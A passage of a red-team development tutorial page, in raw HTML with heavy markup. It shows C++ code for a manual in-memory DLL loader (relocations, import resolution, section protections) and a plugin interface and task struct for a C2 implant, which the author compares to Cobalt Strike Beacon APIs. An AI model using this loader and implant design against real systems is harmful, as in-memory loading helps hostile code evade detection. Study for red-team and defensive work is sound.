focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_378qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">HMODULE MapImage(const uint8_t* dll, size_t dllSize) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    HMODULE out{};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (!dll || dllSize &lt; sizeof(IMAGE_DOS_HEADER)) return out;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // Copy raw into temp buffer<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    void* raw = VirtualAlloc(nullptr, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (!raw) return out;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    std::memcpy(raw, dll, dllSize);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto dos = (PIMAGE_DOS_HEADER)raw;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (dos-&gt;e_magic != IMAGE_DOS_SIGNATURE) { VirtualFree(raw, 0, MEM_RELEASE); return out; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto nt = (PIMAGE_NT_HEADERS)((uint8_t*)raw + dos-&gt;e_lfanew);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (nt-&gt;Signature != IMAGE_NT_SIGNATURE) { VirtualFree(raw, 0, MEM_RELEASE); return out; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    SIZE_T imageSize = nt-&gt;OptionalHeader.SizeOfImage;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    uint8_t* base = (uint8_t*)VirtualAlloc((LPVOID)nt-&gt;OptionalHeader.ImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (!base) base = (uint8_t*)VirtualAlloc(nullptr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (!base) { VirtualFree(raw, 0, MEM_RELEASE); return out; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // Copy headers<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    std::memcpy(base, raw, nt-&gt;OptionalHeader.SizeOfHeaders);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // Copy sections<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto sec = IMAGE_FIRST_SECTION(nt);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    for (int i = 0; i &lt; nt-&gt;FileHeader.NumberOfSections; ++i, ++sec) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        if (sec-&gt;SizeOfRawData == 0) continue;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        std::memcpy(base + sec-&gt;VirtualAddress,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            (uint8_t*)raw + sec-&gt;PointerToRawData,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            sec-&gt;SizeOfRawData);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // Relocations<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    DWORD_PTR delta = (DWORD_PTR)base - nt-&gt;OptionalHeader.ImageBase;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (delta &amp;&amp; nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        auto reloc = (PIMAGE_BASE_RELOCATION)(base + nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        auto end = (uint8_t*)reloc + nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        while ((uint8_t*)reloc &lt; end &amp;&amp; reloc-&gt;SizeOfBlock) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            size_t count = (reloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            auto list = (WORD*)(reloc + 1);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            for (size_t i = 0; i &lt; count; ++i) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                WORD typeOff = list[i];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                WORD type = typeOff &gt;&gt; 12;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                WORD off = typeOff &amp; 0x0FFF;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#ifdef _WIN64<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                if (type == IMAGE_REL_BASED_DIR64) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                    auto* p = (ULONG_PTR*)(base + reloc-&gt;VirtualAddress + off);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                    *p += delta;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                if (type == IMAGE_REL_BASED_HIGHLOW) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                    auto* p = (ULONG_PTR*)(base + reloc-&gt;VirtualAddress + off);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                    *p += delta;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            reloc = (PIMAGE_BASE_RELOCATION)((uint8_t*)reloc + reloc-&gt;SizeOfBlock);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // Imports<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        auto imp = (PIMAGE_IMPORT_DESCRIPTOR)(base + nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        for (; imp-&gt;Name; ++imp) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            const char* lib = (const char*)(base + imp-&gt;Name);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            HMODULE m = LoadLibraryA(lib);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            if (!m) continue;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">            auto thunk = (PIMAGE_THUNK_DATA)(base + imp-&gt;FirstThunk);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            auto origThunk = (PIMAGE_THUNK_DATA)(base + imp-&gt;OriginalFirstThunk);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            for (; thunk-&gt;u1.AddressOfData; ++thunk, ++origThunk) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                FARPROC addr = nullptr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                if (origThunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                    addr = GetProcAddress(m, (LPCSTR)(origThunk-&gt;u1.Ordinal &amp; 0xFFFF));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                else {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                    auto ibn = (PIMAGE_IMPORT_BY_NAME)(base + origThunk-&gt;u1.AddressOfData);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                    addr = GetProcAddress(m, (LPCSTR)ibn-&gt;Name);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#ifdef _WIN64<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                thunk-&gt;u1.Function = (ULONGLONG)addr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                thunk-&gt;u1.Function = (DWORD)addr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // Final section protections<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    sec = IMAGE_FIRST_SECTION(nt);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    for (int i = 0; i &lt; nt-&gt;FileHeader.NumberOfSections; ++i, ++sec) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        DWORD prot = ProtectFromSectionChars(sec-&gt;Characteristics);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        DWORD old;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        SIZE_T size = sec-&gt;Misc.VirtualSize ? sec-&gt;Misc.VirtualSize : sec-&gt;SizeOfRawData;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        if (size)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            VirtualProtect(base + sec-&gt;VirtualAddress, size, prot, &amp;old);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // Make headers RX or at least R<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        DWORD old;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        VirtualProtect(base, nt-&gt;OptionalHeader.SizeOfHeaders, PAGE_READONLY, &amp;old);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    VirtualFree(raw, 0, MEM_RELEASE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    return base;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">From here, you can call your custom export resolver against the returned base.</p><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h3 id="plugin-abi" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#plugin-abi"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_bd8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_bd8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Plugin ABI</div></h3><h4 id="task-payload" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#task-payload"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_bf8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_bf8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Task payload</div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">I like a plain C struct of <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">char* + length</code> pairs so modules can stay light and avoid high-level runtime baggage if they want.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_3j8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">typedef struct TaskApi {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* TaskId; &nbsp; &nbsp; &nbsp; &nbsp;DWORD TaskIdLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* Instruction; &nbsp; DWORD InstructionLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* Command; &nbsp; &nbsp; &nbsp; DWORD CommandLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* Arguments; &nbsp; &nbsp; DWORD ArgumentsLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* File; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DWORD FileLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* ExecTime; &nbsp; &nbsp; &nbsp;DWORD ExecTimeLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">} TaskApi;</span></span></code></pre></div><!--/$--><h3 id="interface-and-exports" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#interface-and-exports"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_bl8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_bl8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Interface &amp; exports</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Keep the ABI tiny and predictable:</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Factory: <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">create_plugin() → IPlugin*</code></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Lifecycle: <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">plugin_init(IPlugin*)</code>, <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">plugin_cleanup(IPlugin*)</code></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Dispatch: <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">plugin_exec(TaskApi* task)</code></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Inside the module: <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">init()</code>, <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">execute(TaskApi*)</code>, <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">cleanup()</code></p></div></li></ul><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_3r8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">class IPlugin {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">public:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; virtual void init() &nbsp; const = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; virtual void execute(TaskApi* task) const = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; virtual void cleanup() const = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; virtual ~IPlugin() = default;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">};</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Keep the same calling convention across the interface and your host typedefs.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Next, some helper functions which I recently came to realize. This is the moment I realized where the Beacon* API functions that the cobalt strike beacon uses come from:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 